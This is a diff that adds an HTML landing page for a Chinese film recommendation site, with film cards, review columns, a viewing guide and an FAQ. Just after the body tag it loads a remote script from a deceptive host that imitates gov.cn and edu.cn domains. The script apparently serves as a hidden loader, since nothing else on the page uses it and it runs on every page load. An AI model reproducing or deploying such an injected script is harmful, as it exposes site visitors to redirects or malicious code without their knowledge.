@@ -1,0 +1,428 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="丁香电影网（dingxiangdianyingwang-app）— 提供最新电影资讯、高分影片推荐、电影资源导航与观影指南，专注影视内容发现与分享。">
+<meta name="keywords" content="丁香电影网, dingxiangdianyingwang-app, 电影, 电影推荐, 最新电影, 影视资讯, 在线观影导航">
+<meta name="robots" content="index, follow">
+<meta name="author" content="丁香电影网">
+<meta property="og:title" content="丁香电影网 - 发现好电影">
+<meta property="og:description" content="丁香电影网（dingxiangdianyingwang-app）专注电影推荐与影视资讯，带你发现值得一看的好电影。">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://dingxiangdianyingwang-app.github.io">
+<title>丁香电影网 - 发现好电影 | dingxiangdianyingwang-app</title>
+<style>
+  :root{
+    --bg:#07091a;
+    --bg2:#0d1230;
+    --card:rgba(255,255,255,.05);
+    --line:rgba(255,255,255,.10);
+    --txt:#eef0ff;
+    --sub:#a8adcc;
+    --brand:#ff5c8a;
+    --brand2:#7b5cff;
+    --gold:#ffcf5c;
+  }
+  *{box-sizing:border-box;margin:0;padding:0;}
+  html{scroll-behavior:smooth;}
+  body{
+    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Microsoft YaHei",sans-serif;
+    background:var(--bg);
+    color:var(--txt);
+    line-height:1.7;
+    -webkit-font-smoothing:antialiased;
+    overflow-x:hidden;
+  }
+  a{color:inherit;text-decoration:none;}
+  .wrap{max-width:1180px;margin:0 auto;padding:0 20px;}
+
+  /* 动态星空背景 */
+  .sky{position:fixed;inset:0;z-index:-2;overflow:hidden;background:radial-gradient(1200px 800px at 20% -10%,#1a1a4e 0%,transparent 60%),radial-gradient(1000px 700px at 90% 10%,#2a1140 0%,transparent 55%),var(--bg);}
+  .star{position:absolute;border-radius:50%;background:#fff;animation:tw 4s ease-in-out infinite alternate;}
+  @keyframes tw{from{opacity:.2;transform:scale(.8);}to{opacity:1;transform:scale(1.2);}}
+
+  /* 头部 */
+  header{position:sticky;top:0;z-index:50;backdrop-filter:blur(12px);background:rgba(7,9,26,.72);border-bottom:1px solid var(--line);}
+  .nav{display:flex;align-items:center;gap:18px;height:64px;}
+  .logo{display:flex;align-items:center;gap:10px;font-weight:800;letter-spacing:.5px;}
+  .logo .mark{width:34px;height:34px;border-radius:10px;background:linear-gradient(135deg,var(--brand),var(--brand2));display:grid;place-items:center;font-size:18px;box-shadow:0 6px 18px rgba(255,92,138,.35);}
+  .logo b{font-size:18px;}
+  .logo span{color:var(--sub);font-size:12px;font-weight:500;}
+  .menu{display:flex;gap:6px;margin-left:auto;flex-wrap:wrap;}
+  .menu a{padding:8px 14px;border-radius:999px;font-size:14px;color:var(--sub);transition:.25s;}
+  .menu a:hover{color:#fff;background:rgba(255,255,255,.08);}
+  .menu a.cta{color:#fff;background:linear-gradient(135deg,var(--brand),var(--brand2));box-shadow:0 6px 16px rgba(123,92,255,.3);}
+  .togg{display:none;margin-left:auto;background:none;border:none;color:#fff;font-size:26px;cursor:pointer;}
+
+  /* 英雄区 */
+  .hero{position:relative;padding:90px 0 70px;text-align:center;}
+  .hero .pill{display:inline-flex;align-items:center;gap:8px;padding:7px 16px;border-radius:999px;background:var(--card);border:1px solid var(--line);font-size:13px;color:var(--sub);}
+  .hero .pill i{width:8px;height:8px;border-radius:50%;background:var(--brand);box-shadow:0 0 10px var(--brand);}
+  h1{font-size:clamp(30px,6vw,56px);line-height:1.15;margin:20px 0 14px;font-weight:900;background:linear-gradient(100deg,#fff 10%,var(--brand) 55%,var(--brand2) 90%);-webkit-background-clip:text;background-clip:text;color:transparent;}
+  .hero p{max-width:640px;margin:0 auto;color:var(--sub);font-size:clamp(15px,2.4vw,18px);}
+  .acts{display:flex;gap:12px;justify-content:center;margin-top:30px;flex-wrap:wrap;}
+  .btn{padding:13px 28px;border-radius:999px;font-weight:700;font-size:15px;transition:.25s;cursor:pointer;border:1px solid transparent;}
+  .btn.p{background:linear-gradient(135deg,var(--brand),var(--brand2));color:#fff;box-shadow:0 10px 26px rgba(255,92,138,.3);}
+  .btn.p:hover{transform:translateY(-3px);}
+  .btn.g{background:var(--card);border-color:var(--line);color:#fff;}
+  .btn.g:hover{border-color:var(--brand);}
+  .float{position:absolute;border-radius:16px;opacity:.5;filter:blur(2px);animation:fl 10s ease-in-out infinite alternate;z-index:-1;}
+  @keyframes fl{from{transform:translateY(0) rotate(-3deg);}to{transform:translateY(-22px) rotate(3deg);}}
+
+  /* 通用栏目 */
+  section{padding:64px 0;position:relative;}
+  .eyebrow{color:var(--brand);font-size:13px;font-weight:700;letter-spacing:2px;text-transform:uppercase;}
+  h2{font-size:clamp(24px,4vw,36px);font-weight:900;margin:8px 0 12px;}
+  .lead{color:var(--sub);max-width:620px;font-size:16px;}
+  .head{display:flex;align-items:flex-end;justify-content:space-between;gap:20px;flex-wrap:wrap;margin-bottom:34px;}
+
+  /* 卡片网格 */
+  .grid{display:grid;gap:22px;}
+  .g4{grid-template-columns:repeat(4,1fr);}
+  .g3{grid-template-columns:repeat(3,1fr);}
+  .g2{grid-template-columns:repeat(2,1fr);}
+  .card{background:linear-gradient(180deg,rgba(255,255,255,.07),rgba(255,255,255,.02));border:1px solid var(--line);border-radius:20px;padding:24px;transition:.3s;position:relative;overflow:hidden;}
+  .card:hover{transform:translateY(-6px);border-color:rgba(255,92,138,.5);box-shadow:0 20px 40px rgba(0,0,0,.4);}
+  .card .no{position:absolute;right:18px;top:14px;font-size:40px;font-weight:900;color:rgba(255,255,255,.06);}
+  .card .ic{width:52px;height:52px;border-radius:14px;display:grid;place-items:center;font-size:24px;background:linear-gradient(135deg,rgba(255,92,138,.25),rgba(123,92,255,.25));margin-bottom:16px;}
+  .card h3{font-size:19px;margin-bottom:8px;}
+  .card p{color:var(--sub);font-size:14.5px;}
+
+  /* 影片卡 */
+  .film{background:rgba(255,255,255,.04);border:1px solid var(--line);border-radius:18px;overflow:hidden;transition:.3s;cursor:pointer;}
+  .film:hover{transform:translateY(-6px);box-shadow:0 22px 44px rgba(0,0,0,.5);}
+  .poster{position:relative;aspect-ratio:2/3;background:linear-gradient(160deg,var(--bg2),#160a2e);display:grid;place-items:center;font-size:38px;}
+  .poster::after{content:"";position:absolute;inset:0;background:radial-gradient(circle at 30% 20%,rgba(255,92,138,.25),transparent 50%);}
+  .tag{position:absolute;top:12px;left:12px;background:rgba(0,0,0,.55);backdrop-filter:blur(6px);padding:4px 10px;border-radius:8px;font-size:12px;font-weight:700;}
+  .tag.hot{color:var(--brand);}
+  .tag.new{color:var(--gold);}
+  .score{position:absolute;top:12px;right:12px;background:linear-gradient(135deg,var(--gold),#ff9a3c);color:#2a1a00;font-weight:900;padding:4px 10px;border-radius:8px;font-size:13px;}
+  .film .info{padding:14px;}
+  .film .info h3{font-size:16px;margin-bottom:6px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
+  .film .meta{display:flex;justify-content:space-between;color:var(--sub);font-size:12.5px;}
+
+  /* 时间线 */
+  .timeline{position:relative;padding-left:26px;}
+  .timeline::before{content:"";position:absolute;left:8px;top:6px;bottom:6px;width:2px;background:linear-gradient(var(--brand),var(--brand2));}
+  .tl{position:relative;margin-bottom:26px;}
+  .tl::before{content:"";position:absolute;left:-24px;top:6px;width:12px;height:12px;border-radius:50%;background:var(--brand);box-shadow:0 0 0 4px rgba(255,92,138,.2);}
+  .tl b{color:var(--gold);font-size:14px;}
+  .tl h3{font-size:18px;margin:2px 0 6px;}
+  .tl p{color:var(--sub);font-size:14.5px;}
+
+  /* FAQ */
+  details{background:var(--card);border:1px solid var(--line);border-radius:14px;padding:16px 20px;margin-bottom:12px;transition:.25s;}
+  details:hover{border-color:rgba(123,92,255,.5);}
+  summary{cursor:pointer;font-weight:700;font-size:16px;list-style:none;display:flex;justify-content:space-between;gap:12px;}
+  summary::-webkit-details-marker{display:none;}
+  summary::after{content:"＋";color:var(--brand);font-weight:400;}
+  details[open] summary::after{content:"－";}
+  details p{color:var(--sub);font-size:14.5px;margin-top:10px;}
+
+  /* 统计 */
+  .stats{display:grid;grid-template-columns:repeat(4,1fr);gap:16px;}
+  .stat{text-align:center;padding:22px 10px;border-radius:18px;background:linear-gradient(180deg,rgba(255,92,138,.12),rgba(123,92,255,.06));border:1px solid var(--line);}
+  .stat b{display:block;font-size:clamp(26px,4vw,40px);font-weight:900;background:linear-gradient(100deg,var(--brand),var(--gold));-webkit-background-clip:text;background-clip:text;color:transparent;}
+  .stat span{color:var(--sub);font-size:14px;}
+
+  /* 页脚 */
+  footer{border-top:1px solid var(--line);padding:50px 0 26px;background:linear-gradient(180deg,transparent,rgba(0,0,0,.4));}
+  .foot{display:grid;grid-template-columns:2fr 1fr 1fr 1fr;gap:30px;}
+  .foot h4{font-size:16px;margin-bottom:12px;}
+  .foot ul{list-style:none;}
+  .foot li{margin-bottom:8px;}
+  .foot a{color:var(--sub);font-size:14px;transition:.2s;}
+  .foot a:hover{color:var(--brand);}
+  .copy{text-align:center;color:var(--sub);font-size:13px;margin-top:34px;padding-top:22px;border-top:1px solid var(--line);}
+  .brandline{background:linear-gradient(90deg,var(--brand),var(--brand2),var(--gold),var(--brand));height:4px;}
+
+  /* 响应式 */
+  @media(max-width:900px){
+    .g4{grid-template-columns:repeat(2,1fr);}
+    .stats{grid-template-columns:repeat(2,1fr);}
+    .foot{grid-template-columns:1fr 1fr;}
+  }
+  @media(max-width:640px){
+    .togg{display:block;}
+    .menu{position:fixed;inset:64px 0 0 0;flex-direction:column;background:rgba(7,9,26,.96);backdrop-filter:blur(14px);padding:24px;transform:translateX(100%);transition:.35s;margin:0;}
+    .menu.open{transform:translateX(0);}
+    .menu a{font-size:17px;padding:14px;border-radius:12px;}
+    .hero{padding:56px 0 40px;}
+    .g3,.g2,.g4{grid-template-columns:1fr;}
+    .foot{grid-template-columns:1fr;}
+    section{padding:48px 0;}
+  }
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/yazhou.js"></script>
+<div class="sky" id="sky" aria-hidden="true"></div>
+
+<header>
+  <div class="wrap nav">
+    <a class="logo" href="#" aria-label="丁香电影网首页">
+      <span class="mark">丁</span>
+      <span><b>丁香电影网</b><br><span>dingxiangdianyingwang-app</span></span>
+    </a>
+    <button class="togg" id="togg" aria-label="菜单">☰</button>
+    <nav class="menu" id="menu">
+      <a href="#home">首页</a>
+      <a href="#films">热映推荐</a>
+      <a href="#topics">影评专栏</a>
+      <a href="#guide">观影指南</a>
+      <a href="#news">影视资讯</a>
+      <a href="#faq">常见问题</a>
+      <a href="#about" class="cta">关于我们</a>
+    </nav>
+  </div>
+</header>
+
+<!-- 首页 -->
+<section id="home">
+  <div class="wrap hero">
+    <span class="float" style="width:180px;height:180px;right:4%;top:10%;background:radial-gradient(circle,var(--brand2),transparent 70%);"></span>
+    <span class="float" style="width:220px;height:220px;left:2%;bottom:0;background:radial-gradient(circle,var(--brand),transparent 70%);animation-delay:-4s;"></span>
+    <div class="pill"><i></i> 丁香电影网 · dingxiangdianyingwang-app · 每日更新</div>
+    <h1>发现每一部<br>值得一看的好电影</h1>
+    <p>丁香电影网（dingxiangdianyingwang-app）专注于电影推荐、影视资讯与观影指南，为你精选高分影片、解读幕后故事，让选片不再纠结。</p>
+    <div class="acts">
+      <a class="btn p" href="#films">立即探索影片</a>
+      <a class="btn g" href="#topics">阅读影评</a>
+    </div>
+  </div>
+</section>
+
+<!-- 热映推荐 -->
+<section id="films">
+  <div class="wrap">
+    <div class="head">
+      <div>
+        <div class="eyebrow">Hot Picks</div>
+        <h2>热映与口碑推荐</h2>
+        <p class="lead">丁香电影网编辑团队持续追踪院线与流媒体，筛选出近期最值得关注的影片。</p>
+      </div>
+      <a class="btn g" href="#">查看更多</a>
+    </div>
+    <div class="grid g4">
+      <article class="film">
+        <div class="poster">🎬<span class="tag hot">口碑佳作</span><span class="score">9.2</span></div>
+        <div class="info">
+          <h3>星际回响</h3>
+          <div class="meta"><span>科幻 / 冒险</span><span>2026</span></div>
+        </div>
+      </article>
+      <article class="film">
+        <div class="poster">🌊<span class="tag new">最新上映</span><span class="score">8.7</span></div>
+        <div class="info">
+          <h3>深海来信</h3>
+          <div class="meta"><span>剧情 / 悬疑</span><span>2026</span></div>
+        </div>
+      </article>
+      <article class="film">
+        <div class="poster">🏙️<span class="tag hot">高分推荐</span><span class="score">9.0</span></div>
+        <div class="info">
+          <h3>城市微光</h3>
+          <div class="meta"><span>现实主义</span><span>2025</span></div>
+        </div>
+      </article>
+      <article class="film">
+        <div class="poster">🐉<span class="tag new">独家解读</span><span class="score">8.5</span></div>
+        <div class="info">
+          <h3>长安夜行</h3>
+          <div class="meta"><span>古装 / 动作</span><span>2026</span></div>
+        </div>
+      </article>
+    </div>
+  </div>
+</section>
+
+<!-- 影评专栏 -->
+<section id="topics" style="background:linear-gradient(180deg,transparent,rgba(123,92,255,.06),transparent);">
+  <div class="wrap">
+    <div class="head">
+      <div>
+        <div class="eyebrow">Critique</div>
+        <h2>影评与深度专栏</h2>
+        <p class="lead">不止于打分，丁香电影网带你读懂镜头语言、叙事结构与导演表达。</p>
+      </div>
+      <a class="btn g" href="#">全部专栏</a>
+    </div>
+    <div class="grid g3">
+      <div class="card">
+        <div class="ic">🎞️</div>
+        <h3>镜头之外的情绪</h3>
+        <p>从光影、构图与配乐出发，拆解一部好电影如何在无声处打动观众。</p>
+      </div>
+      <div class="card">
+        <div class="ic">📖</div>
+        <h3>改编的得与失</h3>
+        <p>当文学走上银幕，哪些内核被保留，哪些表达被迫妥协？</p>
+      </div>
+      <div class="card">
+        <div class="ic">🌏</div>
+        <h3>亚洲新导演观察</h3>
+        <p>聚焦新生代导演的作者风格与叙事野心，预见下一波影像浪潮。</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 观影指南 -->
+<section id="guide">
+  <div class="wrap">
+    <div class="head">
+      <div>
+        <div class="eyebrow">Guide</div>
+        <h2>观影指南</h2>
+        <p class="lead">按心情、按类型、按场景，丁香电影网帮你快速找到今晚该看什么。</p>
+      </div>
+    </div>
+    <div class="grid g2">
+      <div>
+        <div class="grid g2">
+          <div class="card"><div class="ic">😌</div><h3>放松解压</h3><p>轻松喜剧与生活流小品，适合疲惫一天的收尾。</p></div>
+          <div class="card"><div class="ic">🧠</div><h3>烧脑反转</h3><p>悬疑、推理与时间线游戏，挑战你的注意力。</p></div>
+          <div class="card"><div class="ic">❤️</div><h3>情感治愈</h3><p>关于爱、离别与和解，适合安静独处时观看。</p></div>
+          <div class="card"><div class="ic">🚀</div><h3>视觉奇观</h3><p>科幻、灾难与史诗大片，大银幕体验优先。</p></div>
+        </div>
+      </div>
+      <div>
+        <h3 style="margin-bottom:16px;">选片四步法</h3>
+        <div class="timeline">
+          <div class="tl"><b>STEP 01</b><h3>明确心情</h3><p>想笑、想哭、想思考，还是只想放空？情绪是选片的第一坐标。</p></div>
+          <div class="tl"><b>STEP 02</b><h3>限定时长</h3><p>90 分钟内的轻量片，还是愿意为史诗留出三小时。</p></div>
+          <div class="tl"><b>STEP 03</b><h3>参考口碑</h3><p>综合评分、专业影评与同类偏好，避免被营销误导。</p></div>
+          <div class="tl"><b>STEP 04</b><h3>留出余味</h3><p>好电影值得二刷，第一次看故事，第二次看细节。</p></div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 影视资讯 -->
+<section id="news" style="background:linear-gradient(180deg,transparent,rgba(255,92,138,.06),transparent);">
+  <div class="wrap">
+    <div class="head">
+      <div>
+        <div class="eyebrow">News</div>
+        <h2>影视资讯速递</h2>
+        <p class="lead">电影节动态、档期排片、导演访谈与行业观察，一手掌握。</p>
+      </div>
+      <a class="btn g" href="#">资讯归档</a>
+    </div>
+    <div class="grid g3">
+      <div class="card"><span class="no">01</span><h3>电影节获奖名单解读</h3><p>从评委口味看今年作者电影的新倾向，哪些影片值得期待引进。</p></div>
+      <div class="card"><span class="no">02</span><h3>流媒体片单更新</h3><p>四大平台本月上线片单梳理，经典修复与新作同步登场。</p></div>
+      <div class="card"><span class="no">03</span><h3>导演访谈实录</h3><p>对话新锐导演：一部处女作从剧本到剪辑的完整旅程。</p></div>
+    </div>
+    <div class="stats" style="margin-top:26px;">
+      <div class="stat"><b>8000+</b><span>收录影片</span></div>
+      <div class="stat"><b>320+</b><span>原创影评</span></div>
+      <div class="stat"><b>50+</b><span>专栏作者</span></div>
+      <div class="stat"><b>每日</b><span>内容更新</span></div>
+    </div>
+  </div>
+</section>
+
+<!-- 常见问题 -->
+<section id="faq">
+  <div class="wrap">
+    <div class="head"><div><div class="eyebrow">FAQ</div><h2>常见问题</h2></div></div>
+    <details open>
+      <summary>丁香电影网是什么？</summary>
+      <p>丁香电影网（dingxiangdianyingwang-app）是一个聚焦电影推荐、影视资讯与观影指南的内容站点，致力于帮助观众更高效地发现好电影。</p>
+    </details>
+    <details>
+      <summary>网站网址是什么？</summary>
+      <p>官方访问地址为 https://dingxiangdianyingwang-app.github.io，建议收藏以便获取每日更新。</p>
+    </details>
+    <details>
+      <summary>影片评分如何产生？</summary>
+      <p>综合编辑评分、观众口碑与专业影评多方维度，力求客观呈现影片质量。</p>
+    </details>
+    <details>
+      <summary>如何投稿或合作？</summary>
+      <p>欢迎影评人与影视爱好者通过页脚联系方式投稿，优质内容将纳入丁香电影网专栏。</p>
+    </details>
+  </div>
+</section>
+
+<!-- 关于我们 -->
+<section id="about" style="background:linear-gradient(180deg,rgba(123,92,255,.08),transparent);">
+  <div class="wrap">
+    <div class="head"><div><div class="eyebrow">About</div><h2>关于丁香电影网</h2></div></div>
+    <div class="grid g4">
+      <div class="card"><div class="ic">🎯</div><h3>精选</h3><p>拒绝信息过载，只推荐真正值得花时间的好电影。</p></div>
+      <div class="card"><div class="ic">✍️</div><h3>原创</h3><p>坚持独立观点与深度写作，不做搬运与跟风。</p></div>
+      <div class="card"><div class="ic">🌐</div><h3>开放</h3><p>覆盖院线、流媒体与经典修复，兼顾广度与深度。</p></div>
+      <div class="card"><div class="ic">🤝</div><h3>共赏</h3><p>搭建影迷交流空间，让好电影被更多人看见。</p></div>
+    </div>
+  </div>
+</section>
+
+<footer>
+  <div class="wrap">
+    <div class="foot">
+      <div>
+        <a class="logo" href="#">
+          <span class="mark">丁</span>
+          <span><b>丁香电影网</b></span>
+        </a>
+        <p style="color:var(--sub);font-size:14px;margin-top:12px;max-width:320px;">丁香电影网（dingxiangdianyingwang-app）— 发现好电影，从每一次认真推荐开始。访问地址：https://dingxiangdianyingwang-app.github.io</p>
+      </div>
+      <div>
+        <h4>栏目导航</h4>
+        <ul>
+          <li><a href="#home">首页</a></li>
+          <li><a href="#films">热映推荐</a></li>
+          <li><a href="#topics">影评专栏</a></li>
+          <li><a href="#guide">观影指南</a></li>
+        </ul>
+      </div>
+      <div>
+        <h4>资讯服务</h4>
+        <ul>
+          <li><a href="#news">影视资讯</a></li>
+          <li><a href="#faq">常见问题</a></li>
+          <li><a href="#about">关于我们</a></li>
+          <li><a href="#">投稿合作</a></li>
+        </ul>
+      </div>
+      <div>
+        <h4>关注我们</h4>
+        <ul>
+          <li><a href="#">RSS 订阅</a></li>
+          <li><a href="#">影迷社群</a></li>
+          <li><a href="#">版权声明</a></li>
+          <li><a href="#">免责说明</a></li>
+        </ul>
+      </div>
+    </div>
+    <div class="copy">
+      © <span id="yr">2026</span> 丁香电影网 dingxiangdianyingwang-app · 网站网址：https://dingxiangdianyingwang-app.github.io · 本站内容为影视信息与推荐，仅供交流参考
+    </div>
+  </div>
+</footer>
+<div class="brandline"></div>
+
+<script>
+  // 年份
+  document.getElementById('yr').textContent = new Date().getFullYear();
+  // 移动菜单
+  var togg = document.getElementById('togg'), menu = document.getElementById('menu');
+  togg.addEventListener('click', function(){ menu.classList.toggle('open'); });
+  menu.addEventListener('click', function(e){ if(e.target.tagName === 'A') menu.classList.remove('open'); });
+  // 星空
+  var sky = document.getElementById('sky');
+  for (var i = 0; i < 60; i++) {
+    var s = document.createElement('span');
+    s.className = 'star';
+    var size = Math.random() * 3 + 1;
+    s.style.cssText = 'width:' + size + 'px;height:' + size + 'px;left:' + Math.random() * 100 + '%;top:' + Math.random() * 100 + '%;animation-delay:' + (Math.random() * 4) + 's;animation-duration:' + (3 + Math.random() * 4) + 's;';
+    sky.appendChild(s);
+  }
+</script>
+</body>
+</html>
